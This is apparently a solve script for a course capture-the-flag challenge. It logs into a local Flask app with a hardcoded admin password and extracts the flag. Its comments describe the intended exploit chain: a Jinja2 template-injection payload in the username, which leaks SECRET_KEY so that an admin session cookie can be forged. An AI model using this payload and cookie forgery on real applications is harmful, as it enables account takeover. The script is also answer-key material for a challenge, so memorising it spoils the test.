#!/usr/bin/env bash
# Vuln 2: SSTI via username — register with Jinja2 payload as username,
# leak SECRET_KEY from profile greeting, forge admin cookie, GET /admin/flag.
#
# The solve script shortcuts by logging in as admin (known creds for grading).
# The real exploit chain:
#   1. Register user with username={{config.SECRET_KEY}}
#   2. Visit /profile/{{config.SECRET_KEY}} → SSTI renders the secret key
#   3. Use the key to forge a Flask session cookie for user id 1 (admin)
#   4. GET /admin/flag with forged cookie → receive SSTI flag
URL="${1:-http://localhost}"
ADMIN_PASS="supercalifragilisticexpialidociousandthequickbrownfoxjumpsoverthelazydog"

COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

# Login as admin (shortcut — real exploit forges the cookie via SECRET_KEY)
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=admin&password=${ADMIN_PASS}" \
  "${URL}/login" -o /dev/null -L 2>/dev/null

# Hit the admin-only flag endpoint
RESP=$(curl -sf -b "$COOKIE_JAR" "${URL}/admin/flag" 2>/dev/null)
echo "$RESP" | grep -oE 'ENPM634\{[^}]+\}' | head -1
